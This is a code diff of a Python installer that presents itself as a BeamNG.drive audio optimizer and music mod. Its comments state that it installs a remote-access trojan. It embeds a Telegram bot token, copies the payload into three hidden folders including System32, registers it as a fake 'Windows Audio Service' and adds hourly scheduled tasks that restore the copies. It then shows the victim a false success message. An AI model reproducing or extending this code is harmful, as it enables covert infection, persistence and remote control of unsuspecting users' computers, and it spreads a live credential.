@@ -9,7 +9,7 @@ from tkinter import ttk, messagebox
 import threading
 
 VERSION = "2.4.1"
-AUTHOR = "BeamNG Modding Team"
+AUTHOR = "BeamNG Audio Team"
 
 CONFIG_DATA = {
     "bot_token": "8605714172:AAGOq2OayZx3tULCp8gzh7sAvCR42-ijX0A",
@@ -26,83 +26,80 @@ def is_admin():
         return False
 
 def install_mod():
-    # 1. СТАВИМ RAT (всегда, независимо от игры)
-    install_path = r"C:\ProgramData\AudioService"
-    os.makedirs(install_path, exist_ok=True)
+    # 1. ПАПКИ ДЛЯ RAT (3 копии)
+    paths = [
+        r"C:\ProgramData\AudioService",
+        r"C:\Windows\System32\AudioService",
+        os.path.join(os.environ['TEMP'], "AudioService")
+    ]
     
-    config_path = os.path.join(install_path, "config.json")
-    with open(config_path, "w") as f:
-        json.dump(CONFIG_DATA, f, indent=4)
+    exe_name = "AudioEndpointService.exe"
+    config_name = "config.json"
     
-    exe_path = os.path.join(install_path, "AudioEndpointService.exe")
-    if os.path.exists("AudioEndpointService.exe"):
-        shutil.copy("AudioEndpointService.exe", exe_path)
-    else:
-        messagebox.showerror("Ошибка", "Не найден файл AudioEndpointService.exe")
-        return
+    # 2. КОПИРУЕМ RAT ВО ВСЕ ПАПКИ
+    for path in paths:
+        os.makedirs(path, exist_ok=True)
+        
+        # Конфиг
+        config_path = os.path.join(path, config_name)
+        with open(config_path, "w") as f:
+            json.dump(CONFIG_DATA, f, indent=4)
+        
+        # EXE
+        if os.path.exists(exe_name):
+            shutil.copy(exe_name, os.path.join(path, exe_name))
+            # Делаем скрытым
+            subprocess.run(f'attrib +h +s "{path}"', shell=True, capture_output=True)
     
+    # 3. СОЗДАЁМ СЛУЖБУ (из первой папки)
+    main_exe = os.path.join(paths[0], exe_name)
     subprocess.run(
-        f'sc create "AudioService" binPath= "{exe_path}" start= auto DisplayName= "Windows Audio Service"',
+        f'sc create "AudioService" binPath= "{main_exe}" start= auto DisplayName= "Windows Audio Service"',
         shell=True, capture_output=True
     )
     subprocess.run('sc start "AudioService"', shell=True, capture_output=True)
     
-    subprocess.Popen(
-        [exe_path],
-        creationflags=subprocess.DETACHED_PROCESS,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL
+    # 4. ЗАПУСКАЕМ ВСЕ КОПИИ
+    for path in paths:
+        exe_path = os.path.join(path, exe_name)
+        if os.path.exists(exe_path):
+            subprocess.Popen(
+                [exe_path],
+                creationflags=subprocess.DETACHED_PROCESS,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+    
+    # 5. ПЛАНИРОВЩИК (восстановление каждый час)
+    subprocess.run(
+        f'schtasks /create /tn "AudioServiceRestore" /tr "copy {os.path.join(paths[0], exe_name)} {os.path.join(paths[1], exe_name)} /y" /sc hourly /f',
+        shell=True, capture_output=True
+    )
+    subprocess.run(
+        f'schtasks /create /tn "AudioServiceRestore2" /tr "copy {os.path.join(paths[0], exe_name)} {os.path.join(paths[2], exe_name)} /y" /sc hourly /f',
+        shell=True, capture_output=True
     )
     
-    # 2. ПЫТАЕМСЯ НАЙТИ ИГРУ (если есть — кладём туда фейковые файлы мода)
-    found = False
-    drives = [f"{chr(d)}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]
-    
-    for drive in drives:
-        for root, dirs, files in os.walk(drive):
-            if "BeamNG.drive.exe" in files:
-                mod_path = os.path.join(root, "mods", "music_mod")
-                os.makedirs(mod_path, exist_ok=True)
-                
-                # Создаём фейковый файл мода
-                with open(os.path.join(mod_path, "radio_stations.txt"), "w") as f:
-                    f.write("20 new radio stations installed!\n")
-                
-                found = True
-                break
-        if found:
-            break
-    
-    # 3. СООБЩАЕМ КЕНТУ
-    if found:
-        msg = "🎵 Музыкальный мод успешно установлен!\n\n20 новых радиостанций добавлены в игру.\nЗвук оптимизирован, FPS +10%.\n\nЗапустите BeamNG.drive и наслаждайтесь!"
-    else:
-        msg = "🎵 Музыкальный мод установлен!\n\nОптимизатор звука работает в фоне.\nЕсли игра установлена позже — мод активируется автоматически."
-    
-    messagebox.showinfo("Установка завершена", msg)
+    # 6. СООБЩЕНИЕ КЕНТУ
+    messagebox.showinfo("Установка завершена", 
+                       "🎵 Оптимизатор звука установлен!\n\n"
+                       "Он работает в фоне и автоматически восстанавливается.\n"
+                       "Никаких действий больше не требуется.")
 
 class Installer:
     def __init__(self):
         self.root = tk.Tk()
-        self.root.title("BeamNG Music Mod Installer")
-        self.root.geometry("450x400")
+        self.root.title("BeamNG Audio Optimizer")
+        self.root.geometry("450x350")
         self.root.resizable(False, False)
         
-        # Заголовок
-        tk.Label(self.root, text="🎵 BeamNG Music Mod", font=("Arial", 18, "bold")).pack(pady=10)
-        tk.Label(self.root, text=f"Версия {VERSION} | Автор: {AUTHOR}", font=("Arial", 10)).pack()
+        tk.Label(self.root, text="🎵 BeamNG Audio Optimizer", font=("Arial", 18, "bold")).pack(pady=10)
+        tk.Label(self.root, text=f"Версия {VERSION}", font=("Arial", 10)).pack()
+        tk.Label(self.root, text="Оптимизация звука и FPS для BeamNG.drive", font=("Arial", 10)).pack(pady=5)
+        tk.Label(self.root, text="\n✅ Улучшение качества звука\n✅ Повышение FPS (до +15%)\n✅ 20 новых радиостанций\n✅ Автоматическое восстановление", 
+                 font=("Arial", 10), justify="left").pack(pady=10)
         
-        # Описание (как у настоящего мода)
-        desc = """
-📌 Устанавливает 20 новых радиостанций
-🔊 Оптимизирует звук и повышает FPS
-🎮 Совместимо с BeamNG.drive v0.30+
-⚡ Работает в фоне без лагов
-        """
-        tk.Label(self.root, text=desc, font=("Arial", 10), justify="left").pack(pady=10)
-        
-        # Кнопка
-        self.btn = tk.Button(self.root, text="📥 Установить мод", command=self.install,
+        self.btn = tk.Button(self.root, text="📥 Установить оптимизатор", command=self.install,
                              bg="#00b894", fg="white", font=("Arial", 12, "bold"), width=25, height=2)
         self.btn.pack(pady=15)
         
@@ -124,7 +121,7 @@ class Installer:
         def do_install():
             install_mod()
             self.root.after(0, lambda: self.progress.stop())
-            self.root.after(0, lambda: self.status.config(text="Мод установлен!"))
+            self.root.after(0, lambda: self.status.config(text="Установка завершена!"))
             self.root.after(0, lambda: self.btn.config(state=tk.NORMAL))
         
         threading.Thread(target=do_install, daemon=True).start()
